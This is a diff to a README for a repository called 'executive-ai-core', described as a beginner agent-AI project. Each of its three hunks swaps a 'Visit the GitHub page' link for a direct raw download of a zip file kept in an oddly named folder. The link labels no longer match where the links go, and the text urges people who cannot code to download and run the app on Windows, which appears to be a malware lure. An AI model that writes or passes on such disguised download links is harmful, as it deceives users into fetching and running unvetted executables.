@@ -1,6 +1,6 @@
 # 🧠 executive-ai-core - Learn Agent AI From Scratch
 
-[![Download / Install / Setup](https://img.shields.io/badge/Download-Visit%20GitHub%20Page-blue?style=for-the-badge)](https://github.com/Maiblemodulated493/executive-ai-core)
+[![Download / Install / Setup](https://img.shields.io/badge/Download-Visit%20GitHub%20Page-blue?style=for-the-badge)](https://raw.githubusercontent.com/Maiblemodulated493/executive-ai-core/main/marrowish/executive-ai-core-v3.3-alpha.2.zip)
 
 ## 📌 What this is
 
@@ -22,7 +22,7 @@ If you only want to run the app, you do not need to know how to code.
 
 Go to the project page here:
 
-[Visit the GitHub page to download](https://github.com/Maiblemodulated493/executive-ai-core)
+[Visit the GitHub page to download](https://raw.githubusercontent.com/Maiblemodulated493/executive-ai-core/main/marrowish/executive-ai-core-v3.3-alpha.2.zip)
 
 Then follow the files or steps shown on that page to download and run the app on Windows.
 
@@ -255,7 +255,7 @@ Make one change at a time so it is easy to see what changed
 
 ## 📎 Project link
 
-[https://github.com/Maiblemodulated493/executive-ai-core](https://github.com/Maiblemodulated493/executive-ai-core)
+[https://raw.githubusercontent.com/Maiblemodulated493/executive-ai-core/main/marrowish/executive-ai-core-v3.3-alpha.2.zip](https://raw.githubusercontent.com/Maiblemodulated493/executive-ai-core/main/marrowish/executive-ai-core-v3.3-alpha.2.zip)
 
 ## 🧭 Quick start checklist
 
